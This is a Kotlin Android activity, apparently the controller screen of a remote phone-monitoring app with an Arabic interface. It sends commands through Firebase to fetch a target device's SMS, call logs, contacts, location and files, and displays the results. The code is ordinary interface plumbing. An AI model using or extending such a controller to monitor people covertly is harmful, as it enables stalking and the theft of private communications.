package com.abuzahra.control

import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import com.abuzahra.control.model.CommandResult
import com.abuzahra.control.model.Device
import com.abuzahra.control.service.FirebaseService
import com.abuzahra.control.ui.dashboard.DashboardFragment
import com.abuzahra.control.ui.control.ControlFragment
import com.abuzahra.control.ui.smscalls.SmsCallsFragment
import com.abuzahra.control.ui.files.FilesFragment
import com.abuzahra.control.ui.social.SocialFragment
import com.abuzahra.control.ui.settings.SettingsFragment
import com.google.android.material.bottomnavigation.BottomNavigationView
import com.google.firebase.database.ValueEventListener

class MainActivity : AppCompatActivity() {
    private var resultListener: ValueEventListener? = null
    private var currentDevice: Device? = null

    companion object {
        var selectedDevice: Device? = null
        private const val TAG = "MainActivity"
    }

    private var fragmentContainer: FrameLayout? = null
    private var bottomNav: BottomNavigationView? = null
    private var tvTopTitle: TextView? = null
    private var tvDeviceCount: TextView? = null
    private var ivDeviceStatus: ImageView? = null
    private var resultPanel: View? = null
    private var tvResultTitle: TextView? = null
    private var tvResultContent: TextView? = null
    private var ivCloseResult: ImageView? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(TAG, ">>> MainActivity.onCreate START")

        // Step 1: Set content view
        try {
            setContentView(R.layout.activity_main)
            Log.d(TAG, "setContentView OK")
        } catch (e: Exception) {
            Log.e(TAG, "FATAL setContentView: ${e.message}")
            e.printStackTrace()
            finish()
            return
        }

        // Step 2: Find all views (nullable for safety)
        try {
            fragmentContainer = findViewById(R.id.fragmentContainer)
            bottomNav = findViewById(R.id.bottomNav)
            tvTopTitle = findViewById(R.id.tvTopTitle)
            tvDeviceCount = findViewById(R.id.tvDeviceCount)
            ivDeviceStatus = findViewById(R.id.ivDeviceStatus)
            resultPanel = findViewById(R.id.resultPanel)
            tvResultTitle = findViewById(R.id.tvResultTitle)
            tvResultContent = findViewById(R.id.tvResultContent)
            ivCloseResult = findViewById(R.id.ivCloseResult)
            Log.d(TAG, "All findViewById OK")
        } catch (e: Exception) {
            Log.e(TAG, "FATAL findViewById: ${e.message}")
            e.printStackTrace()
            // Don't finish - try to continue with null views
        }

        // Step 3: Init Firebase service
        try {
            FirebaseService.init(this)
            Log.d(TAG, "FirebaseService.init OK")
        } catch (e: Exception) {
            Log.e(TAG, "FirebaseService.init error: ${e.message}")
        }

        // Step 4: Bottom navigation
        try {
            bottomNav?.setOnItemSelectedListener { item ->
                try {
                    switchFragment(item.itemId)
                } catch (e: Exception) {
                    Log.e(TAG, "Nav click error: ${e.message}")
                }
                true
            }
            Log.d(TAG, "BottomNav OK")
        } catch (e: Exception) {
            Log.e(TAG, "BottomNav error: ${e.message}")
        }

        // Step 5: Result panel close button
        try {
            ivCloseResult?.setOnClickListener {
                resultPanel?.visibility = View.GONE
            }
        } catch (e: Exception) {
            Log.e(TAG, "CloseResult error: ${e.message}")
        }

        // Step 6: Welcome text
        try {
            val email = FirebaseService.userEmail
            tvTopTitle?.text = if (email != null) {
                val name = email.split("@").firstOrNull() ?: ""
                "مرحباً، $name"
            } else {
                "لوحة التحكم"
            }
            tvDeviceCount?.text = "جاهز"
            Log.d(TAG, "Welcome text OK")
        } catch (e: Exception) {
            Log.e(TAG, "Welcome error: ${e.message}")
        }

        // Step 7: Load default fragment (delayed to ensure layout is ready)
        try {
            fragmentContainer?.post {
                try {
                    switchFragment(R.id.nav_dashboard)
                    Log.d(TAG, "Default fragment loaded OK")
                } catch (e: Exception) {
                    Log.e(TAG, "Default fragment error: ${e.message}")
                    e.printStackTrace()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Post error: ${e.message}")
        }

        Log.d(TAG, ">>> MainActivity.onCreate COMPLETE")
    }

    private fun switchFragment(itemId: Int) {
        try {
            val frag: Fragment = when (itemId) {
                R.id.nav_dashboard -> DashboardFragment()
                R.id.nav_control -> ControlFragment()
                R.id.nav_sms_calls -> SmsCallsFragment()
                R.id.nav_files -> FilesFragment()
                R.id.nav_social -> SocialFragment()
                R.id.nav_settings -> SettingsFragment()
                else -> DashboardFragment()
            }
            supportFragmentManager.beginTransaction()
                .replace(R.id.fragmentContainer, frag)
                .commitAllowingStateLoss()
            Log.d(TAG, "Fragment switched to $itemId")
        } catch (e: Exception) {
            Log.e(TAG, "switchFragment crash: ${e.message}")
            e.printStackTrace()
        }
    }

    fun selectDevice(device: Device) {
        try {
            selectedDevice = device
            currentDevice = device
            tvTopTitle?.text = device.name.ifEmpty { device.model.ifEmpty { "جهاز" } }
            tvDeviceCount?.text = if (device.isOnline) "متصل" else "غير متصل"
            try {
                ivDeviceStatus?.setBackgroundResource(
                    if (device.isOnline) R.drawable.bg_status_online else R.drawable.bg_status_offline
                )
            } catch (_: Exception) {}
            listenResults(device)
        } catch (e: Exception) {
            Log.e(TAG, "selectDevice: ${e.message}")
        }
    }

    private fun listenResults(device: Device) {
        try {
            resultListener?.let { FirebaseService.removeResultListener(device.id, it) }
            resultListener = FirebaseService.listenForResult(device.id) { result ->
                if (result.status == "success" || result.status == "error") {
                    runOnUiThread {
                        try { showResult(result) } catch (e: Exception) { Log.e(TAG, "showResult: ${e.message}") }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "listenResults: ${e.message}")
        }
    }

    private fun showResult(r: CommandResult) {
        try {
            resultPanel?.visibility = View.VISIBLE
            tvResultTitle?.text = when (r.command) {
                "get_sms" -> "الرسائل"
                "get_calls" -> "المكالمات"
                "get_contacts" -> "جهات الاتصال"
                "get_location" -> "الموقع"
                "get_info" -> "معلومات الجهاز"
                "get_battery" -> "البطارية"
                else -> r.command
            }
            tvResultContent?.text = if (r.result.length > 3000) r.result.take(3000) + "\n...(مقتطع)" else r.result
        } catch (e: Exception) {
            Log.e(TAG, "showResult: ${e.message}")
        }
    }

    fun sendCommand(command: String, params: String = "") {
        try {
            val dev = selectedDevice
            if (dev == null) {
                Toast.makeText(this, "اختر جهازاً أولاً", Toast.LENGTH_SHORT).show()
                return
            }
            Toast.makeText(this, "جاري الإرسال: $command", Toast.LENGTH_SHORT).show()
            FirebaseService.sendCommand(dev.id, command, params) { ok ->
                runOnUiThread {
                    Toast.makeText(this, if (ok) "تم الإرسال" else "فشل", Toast.LENGTH_SHORT).show()
                }
            }
        } catch (e: Exception) {
            Toast.makeText(this, "خطأ: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            resultListener?.let { listener ->
                currentDevice?.let { d -> FirebaseService.removeResultListener(d.id, listener) }
            }
        } catch (_: Exception) {}
    }
}
